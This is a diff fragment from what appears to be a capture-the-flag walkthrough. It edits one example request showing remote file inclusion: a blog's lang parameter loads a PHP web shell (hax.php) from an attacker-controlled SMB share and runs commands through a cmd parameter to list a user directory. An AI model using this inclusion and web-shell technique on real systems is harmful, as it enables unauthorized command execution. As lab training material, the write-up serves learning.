@@ -266,7 +266,7 @@ force user = nobody
 <p>This returns the HTML elements of the script, when we view the source; to use it, we append <code>&amp;cmd=some+command+here</code> to the url (make sure to change the request type to POST as well).</p>
 <p>From there, we can run commands, e.g:</p>
 <blockquote>
-<p>POST /blog/?lang=\\10.10.14.34\share\hax.php&amp;cmd=dir+..\user\</p>
+<p>http://10.10.10.151/blog/?lang=\\10.10.14.34\share\hax.php&amp;cmd=dir+..\user\</p>
 </blockquote>
 <p>To view the contents of the /user directory (from our initial dirb scans). This shows us some cool stuff:</p>
 <pre><code>10/01/2019  08:44 AM    &lt;DIR&gt;          .
